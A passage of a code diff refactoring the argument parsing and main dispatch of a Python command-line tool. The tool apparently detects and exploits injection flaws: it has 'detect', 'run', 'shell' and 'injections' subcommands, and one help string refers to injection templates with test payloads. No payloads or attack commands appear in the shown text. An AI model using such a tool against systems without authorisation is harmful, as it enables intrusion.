-        formatter_class=argparse.RawDescriptionHelpFormatter,
-    )
-    _add_common(p_shell)
-
-    # ── injections ────────────────────────────────────────────────────────────
-    sub.add_parser(
-        "injections",
-        help="List all supported injection templates with test payloads",
-    )
+    sub.add_parser("injections", help="List injection templates")
 
     return root
 
@@ -1268,28 +1190,25 @@ Examples:
 # ══════════════════════════════════════════════════════════════════════════════
 
 def main():
-    global _verbose
-
+    global VERBOSE
     print(BANNER)
     parser = build_parser()
     args   = parser.parse_args()
-    _verbose = getattr(args, "verbose", False)
+    VERBOSE = getattr(args, "verbose", False)
+
+    if args.command == "injections":
+        cmd_injections(args)
+        return
 
     dispatch = {
-        "detect":     cmd_detect,
-        "run":        cmd_run,
-        "shell":      cmd_shell,
-        "injections": cmd_injections,
+        "detect": cmd_detect,
+        "run":    cmd_run,
+        "shell":  cmd_shell,
     }
-
-    fn = dispatch[args.command]
-    if args.command == "injections":
-        fn(args)
-    else:
-        try:
-            asyncio.run(fn(args))
-        except KeyboardInterrupt:
-            warn("Interrupted.")
+    try:
+        asyncio.run(dispatch[args.command](args))
+    except KeyboardInterrupt:
+        warn("Interrupted.")
 
 
 if __name__ == "__main__":
